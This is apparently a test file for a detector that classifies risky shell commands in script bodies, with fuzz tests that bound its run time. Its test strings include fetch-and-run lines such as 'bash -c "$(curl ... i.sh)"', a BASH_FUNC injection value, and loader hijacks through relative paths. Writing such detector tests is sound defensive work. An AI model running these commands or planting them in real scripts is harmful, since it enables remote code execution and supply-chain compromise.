  const is = (want: ClassName[], cmds: string[]) => { for (const c of cmds) expect(classes(c), c).toEqual(want); };
  test("code built by an expansion and run by a shell, eval or source", () => {
    is(["computed-command"], ['bash -c "$(curl -fsSL https://x/i.sh)"', 'eval "$(cat lib/x.txt)"', ". <(curl -s u)", 'env -S "$(cat lib/x.txt)"']);
  });
  test("bash -co NAME 'code' and -cO NAME", () => {
    is(F, ["bash -co pipefail 'node -r ./p.js a.js'", "bash -cO extglob 'node -r ./p.js a.js'"]);
  });
  test("-v and -h are not version flags for a shell, and -v is verbose for python", () => {
    is(["interp-stdin"], ["sh -v < evil.sh", "bash -h < evil.sh", "python3 -v < evil.py"]);
    is([], ["bash --version", "sh --help", "python3 --version"]);
  });
  test("PATH and HOME values built from $PWD or a substitution are not known to be absolute", () => {
    is(["env-assign"], ["PATH=$PWD/bin:$PATH node a.js", "HOME=$PWD zsh a.sh", "PATH=$(pwd)/bin:$PATH node a.js"]);
    is([], ["PATH=$PATH:bin node a.js", "PATH=/usr/bin:$PATH node a.js", "HOME=$HOME node a.js"]);
  });
  test("php -c and -z, ruby -C, node --snapshot-blob, deno flags before the subcommand", () => {
    is(F, ["php -c ./evil.ini a.php", "php -z ./evil.so a.php", "node --snapshot-blob=snap.blob index.js", "deno --preload ./e.ts a.ts"]);
    is(["cd-relative"], ["ruby -C sub a.rb"]);
  });
  test("env: any NAME=value, -P, and a bash function variable", () => {
    is(F, ["env X.Y=1 node -r ./p.js a.js", "env -P . node -r ./p.js a.js"]);
    is(["env-assign"], ["env 'BASH_FUNC_node%%=() { evil; }' bash -c 'node a.js'"]);
  });
  test("for((..)) without a space, a multi-digit fd, time { }, coproc NAME { }, trap", () => {
    is(F, ["for((i=0;i<1;i++)); do node --loader ./l.mjs a.js; done", "10>/dev/null node -r ./p.js a.js", "time { node -r ./p.js a.js; }", "coproc X { node -r ./p.js a.js; }", "trap 'node -r ./p.js a.js' EXIT"]);
  });
  test("a file this body wrote, run by an absolute path or a path with . and .. segments", () => {
    is(["writer-exec"], ["cat lib/p > /tmp/p.js && node /tmp/p.js", "cat t > b.js && node lib/../b.js", "cat t > lib/x.js && node lib/./x.js"]);
  });
  test("sed w, s///w and awk print > write files; awk @include and xargs", () => {
    is(["writer-exec"], ["sed -n 'w b.js' t && node b.js", "sed 's/a/b/w b.js' t && node b.js", "awk 'BEGIN{print \"x\" > \"b.js\"}' && node b.js"]);
    is(["program-file"], ["gawk '@include \"x\"' a"]);
    is(["interp-stdin"], ["printf lib/setup.js | xargs node"]);
  });
  test("make variables and loader variables that name a relative path", () => {
    is(["env-assign"], ["MAKEFILES=evil.mk make", "PYTHON=./evil.sh node-gyp rebuild", "CC=./x.sh node-gyp rebuild", "make CC=./x"]);
    is([], ["CC=clang make", "make CC=gcc"]);
  });
  test("false holds: awk file names and -v, node switches and V8 value flags", () => {
    is([], ["awk '{print}' system.log", "awk -vprefix=x '{print}' f", "node --no-warnings build prod", "node --max-old-space-size 4096 a.js", "node --max-old-space-size=4096 a.js", "node --max-semi-space-size 16 a.js"]);
  });
  test("sed --expression with the script as a separate argument", () => {
    is(["program-file"], ["sed --expression 'e id' f"]);
  });
  test("a double-quoted heredoc delimiter keeps a backslash that does not escape $ ` \" or a backslash", () => {
    is([], ['cat <<"E\\OF"\nx\nE\\OF\n']);
    is(["heredoc"], ['cat <<"E\\OF"\nx\nEOF\n']);
  });
});

describe("shell classes: bounded work", () => {
  const rep = (s: string, n: number) => s.repeat(n);
  const inputs: [string, string, ClassName[]][] = [
    ["quotes", rep("'", MAX_LEN - 1), []],
    ["dollar parens", rep("$(", MAX_LEN / 2 - 1), []],
    ["heredocs", rep("cat <<E\n", MAX_LEN / 8 - 1), ["heredoc"]],
    ["parens", rep("(", MAX_LEN - 1), []],
    ["backticks", rep("`", MAX_LEN - 1), []],
    ["nested subshell", rep("sh -c '", 400) + "x" + rep("'", 400), ["interp-stdin"]],
    ["many stages", rep("node a.js | ", MAX_LEN / 12 - 1) + "sh", []],
    ["many redirects", rep("cat >a ", MAX_LEN / 7 - 1), []],
    ["long word", "node " + rep("a", MAX_LEN - 10), []],
    ["unterminated heredoc lines", "sh <<E\n" + rep("x\n", MAX_LEN / 2 - 10), ["heredoc"]],
    ["escapes", rep("\\ ", MAX_LEN / 2 - 1), []],
    ["braces", rep("${", MAX_LEN / 2 - 1), []],
    ["over the cap", rep("node a.js;", MAX_LEN), ["over-cap"]],
    ["double quotes with dollars", '"' + rep("$(", MAX_LEN / 2 - 3) + '"', []],
  ];
  for (const [name, input, want] of inputs) {
    test(`${name}: the result, within a generous bound`, () => {
      const t = performance.now();
      const got = [...new Set(flagBody(input).map((h) => h.cls))].sort();
      expect(got).toEqual(want);
      expect(performance.now() - t).toBeLessThan(500);
    });
  }

  test("random inputs finish within a generous bound each and do not throw", () => {
    const alphabet = ["'", '"', "`", "$(", ")", "(", "<<", "<<-", "<<<", ">", "|", "&", ";", "\n", "\\", " ", "sh", "node", "-r", "cd", "EOF", "x", "${", "}", "-c"];
    let seed = 12345;
    const rnd = (n: number) => { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed % n; };
    for (let i = 0; i < 400; i++) {
      let s = "";
      for (let k = rnd(60); k > 0; k--) s += alphabet[rnd(alphabet.length)];
      const t = performance.now();
      expect(() => flagBody(s)).not.toThrow();
      expect(performance.now() - t, JSON.stringify(s)).toBeLessThan(500);
    }
  });
});
